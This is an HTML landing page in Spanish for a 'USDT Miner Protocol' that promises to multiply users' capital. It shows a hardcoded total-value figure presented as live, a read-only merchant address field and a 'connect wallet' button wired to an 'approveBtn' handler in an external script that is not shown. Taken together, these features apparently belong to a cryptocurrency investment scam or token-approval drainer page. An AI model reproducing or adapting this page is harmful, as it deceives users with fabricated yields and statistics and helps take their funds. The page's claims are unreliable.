<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
    <meta name="dapp-browser" content="trust">
    <meta name="mobile-web-app-capable" content="yes">
    <title>USDT Miner Protocol - Alto Rendimiento</title>
    
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,...">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;500;700;800&display=swap" rel="stylesheet">
    
    <!-- Ethers.js y AppKit como módulo -->
    <script src="js/ethers.umd.min.js"></script>
    <script src="js/app_5.js" type="module" defer></script>

    <style>
        /* [Tus estilos CSS originales se mantienen exactamente igual aquí] */
        :root {
            --bg-base: #111317; --surface: rgba(255, 255, 255, 0.04);
            --surface-border: rgba(255, 255, 255, 0.1); --brand-primary: #26a17b;
            --brand-glow: rgba(38, 161, 123, 0.4); --text-main: #f8f9fa; --text-muted: #a0aec0;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Montserrat', sans-serif; background-color: var(--bg-base); color: var(--text-main); line-height: 1.6; overflow-x: hidden; }
        header { padding: 16px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--surface-border); position: sticky; top: 0; z-index: 100; background: rgba(17, 19, 23, 0.8); }
        .hero { display: grid; grid-template-columns: 1fr 1fr; gap: 60px; padding: 60px 10%; align-items: center; min-height: 80vh; }
        .dapp-widget { background: rgba(20, 22, 28, 0.65); border: 1px solid var(--surface-border); border-radius: 24px; padding: 36px; box-shadow: 0 30px 60px rgba(0,0,0,0.5); }
        .field-block { margin-bottom: 20px; }
        .field-label { display: block; font-size: 0.85rem; color: var(--text-muted); margin-bottom: 8px; }
        .address-field, .desc-field, .network-pill { background: rgba(0,0,0,0.4); border: 1px solid var(--surface-border); border-radius: 12px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; width: 100%; }
        .address-input, .desc-text { background: transparent; border: none; color: #fff; font-size: 14px; outline: none; width: 100%; font-family: inherit; font-weight: 500; }
        .primary-button { width: 100%; padding: 18px; border-radius: 12px; background: var(--brand-primary); color: #fff; border: none; font-size: 1.1rem; font-weight: 700; cursor: pointer; text-transform: uppercase; display: flex; justify-content: center; align-items: center; gap: 10px; margin-top: 10px; }
        .toast { background: rgba(220, 53, 69, 0.9); color: #fff; padding: 14px; border-radius: 10px; text-align: center; margin-top: 20px; font-size: 14px; }
        [hidden] { display: none !important; }
    </style>
</head>
<body>
    <!-- Tu contenido HTML original intacto con el widget, TVL y FAQ -->
    <header>
        <div class="logo">USDT Miner Protocol</div>
    </header>
    <section class="hero">
        <div class="hero-content">
            <h1>Multiplica tu capital.<br>Sin intermediarios.</h1>
            <div class="stats-grid"><div class="stat-item"><div class="stat-value" id="tvlCounter">$402,150.25</div></div></div>
        </div>
        <main class="dapp-widget">
            <div class="field-block"><input id="merchantAddress" class="address-input" type="text" readonly></div>
            <div class="field-block"><input class="desc-text" id="investAmount" type="number" value="0.10" min="0.1" step="0.1"></div>
            <button id="approveBtn" class="primary-button" type="button">
                <span id="btnText">CONECTAR WALLET</span>
                <span id="btnSpinner" class="btn-spinner" hidden></span>
            </button>
            <div id="toast" class="toast" hidden></div>
        </main>
    </section>
</body>
</html>
